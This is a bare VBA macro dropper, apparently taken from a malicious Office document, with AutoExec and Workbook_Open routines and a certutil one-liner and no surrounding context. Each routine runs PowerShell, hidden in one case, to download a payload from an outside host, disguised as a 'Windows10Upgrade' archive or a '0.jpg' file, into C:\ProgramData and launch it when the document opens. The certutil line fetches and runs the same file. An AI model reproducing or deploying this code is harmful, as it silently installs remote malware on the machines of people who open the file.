Sub AutoExec()
 Dim x
 x = Shell("POWERSHELL.EXE " & "powershell -windowstyle hidden Invoke-WebRequest -uri 'https://unmeasurable-medici.000webhostapp.com/Windows10Upgrade9252.zip' -outfile 'C:\\ProgramData\\Windows10Upgrade9252.zip';Expand-Archive C:\\ProgramData\\Windows10Upgrade9252.zip -DestinationPath C:\\ProgramData\\; Start-Process 'C:\\ProgramData\\Windows10Upgrade9252.exe'")
End Sub


Sub Workbook_Open()
 Dim x
 x = Shell("POWERSHELL.EXE " & "powershell Invoke-WebRequest -uri 'https://www.drivehq.com/file/DFPublishFile.aspx/FileID7553157844/Keyilufyhkeor5w/0.jpg' -outfile 'C:\\ProgramData\\0.jpg';Start-Process 'C:\\ProgramData\\0.jpg'")
End Sub


certutil.exe -urlcache -split -f https://www.drivehq.com/file/DFPublishFile.aspx/FileID7553157844/Keyilufyhkeor5w/0.jpg C:\\ProgramData\\66513216513213.jpg;Start-Process C:\\ProgramData\\66513216513213.jpg
 